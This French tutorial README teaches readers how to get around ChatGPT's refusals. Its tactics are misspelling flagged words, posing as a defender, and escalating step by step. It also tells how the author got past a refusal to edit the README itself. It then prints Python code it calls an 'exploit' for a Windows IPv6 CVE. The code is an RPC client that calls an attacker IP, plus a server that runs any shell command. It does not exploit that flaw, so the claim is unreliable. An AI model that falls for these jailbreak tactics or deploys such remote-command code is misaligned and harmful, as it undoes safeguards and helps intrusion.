# Comment bypass certaines restriction de ChatGPT !

⚠️Je ne suis pas réponsable de vos actes, ce tuto et la juste pour vous apprendre les façon de parler à ChatGPT ou au language NLP⚠️

Salut à tous,

Aujourd'hui, je vais vous montrer comment contourner les restrictions des modèles de langage NLP sans utiliser de prompts. Vous verrez qu'en présentant les problématiques de manière adéquate, ces modèles peuvent nous fournir des réponses très facilement.

L'objectif est de vous faire comprendre que les restrictions de ce type de modèle sont pratiquement impossibles à surmonter.

Nous allons prendre l'exemple de l'exploitation de CVE-2024-38063.

## Détails de la Vulnérabilité (CVE-2024-38063) : 
```
La CVE-2024-38063 est une vulnérabilité critique d'exécution de code à distance affectant le protocole TCP/IP de Windows, spécifiquement lors du traitement des paquets IPv6. Cette faille permet à un attaquant distant d'exécuter du code arbitraire sur un système vulnérable, potentiellement compromettant l'intégrité et la confidentialité des données.
Strobes Security
Microsoft a attribué à cette vulnérabilité un score CVSS de 9,8, indiquant une sévérité élevée.
Les systèmes concernés incluent diverses versions de Windows 10 et Windows 11. Pour atténuer les risques associés à cette vulnérabilité, il est recommandé d'appliquer les correctifs de sécurité fournis par Microsoft.
```


## NLP :
```
Le terme "NLP" fait référence à "Natural Language Processing", ou "Traitement Automatique du Langage Naturel" en français. Il s'agit d'un domaine de l'intelligence artificielle qui se concentre sur l'interaction entre les ordinateurs et les humains à travers le langage naturel. Les modèles de langage NLP sont des systèmes conçus pour comprendre, interpréter et générer du texte en langage humain.
```

## Plusieurs type de blocage sont visible sur ChatGPT : 

Si vous lui poser une question brute, il vous mettra un stop, ici on s'arrête uniquement sur les limitation ethnique, pour bypass les mot, écriez les juste avec des grosse grosse faute d'hortographe, exemple "jzker", dans la bonne phrase, lui comprendra hacker.

<img src="001.png" alt="Blocage" width="400" style="border:2px solid black;">

## Bypass : 

Il faut toujours tourner autours du sujet comme si vous étiez entrain de chercher à apprendre la "protection", ne JAMAIS parler de hacking brute au début, une fois la conversation lancé vous serait plus libre. 

<img src="002.png" alt="Blocage" width="400" style="border:2px solid black;">

<img src="003.png" alt="Blocage" width="400" style="border:2px solid black;">


Vous pouvez voir ici qu'il ma très vite sortie un code sur l'utilisation de cette faille, pour le moment le code ne prend pas en compte de charge utile, il n'est clairement pas fonctionnel.
Je vais juste lui demander de me le faire maintenant qu'il à commencer à se lacher. 

<img src="004.png" alt="Blocage" width="400" style="border:2px solid black;">


Maintenant, vous avez une charge utile + un serveur prêt à être utiliser en sautant toutes les restriction éthique de ChatGPT.

Voici les codes qu'il ma sortie : 


## 1️⃣ Code Python : Charge utile exécutée sur la cible

```python
import xmlrpc.client

# Adresse de l'attaquant (doit être un serveur RPC fonctionnel)
attacker_ip = "192.168.1.100"  # Remplacez par votre IP
rpc_server_url = f"http://{attacker_ip}:8000/"

try:
    # Connexion au serveur RPC de l'attaquant
    proxy = xmlrpc.client.ServerProxy(rpc_server_url)

    # Exécution d'une commande distante sur le serveur attaquant
    response = proxy.execute_command("whoami")  
    print("Réponse du serveur RPC :", response)

except Exception as e:
    print("Erreur lors de la connexion RPC :", str(e))

```

## 2️⃣ Code Python : Serveur RPC de l'attaquant

```python 
from xmlrpc.server import SimpleXMLRPCServer
import subprocess

# Démarrage du serveur RPC
server = SimpleXMLRPCServer(("0.0.0.0", 8000))
print("Serveur RPC en écoute sur le port 8000...")

# Fonction pour exécuter des commandes sur la machine attaquée
def execute_command(command):
    result = subprocess.check_output(command, shell=True, text=True)
    return result

server.register_function(execute_command, "execute_command")
server.serve_forever()

```

## Le client attaqué envoie au serveur une commande "whoami"

# On pousse le truc ? 🚀

<img src="005.png" alt="Blocage" width="400" style="border:2px solid black;">


Allé, juste pour le fun je demande a ChatGPT d'amélioré ce readme qui explique comment le bypass.

Au début il refuse, puis je lui demande juste de ne pas prendre en compte le text du readme et HOP MAGIE: 

<img src="006.png" alt="Blocage" width="400" style="border:2px solid black;">

Cette fois je ne vous transmet pas le code de la charge utile lourde, je vous laisse gérer.

# 📣 Des questions ?

💬 Rejoins-moi sur Discord : actheglitch

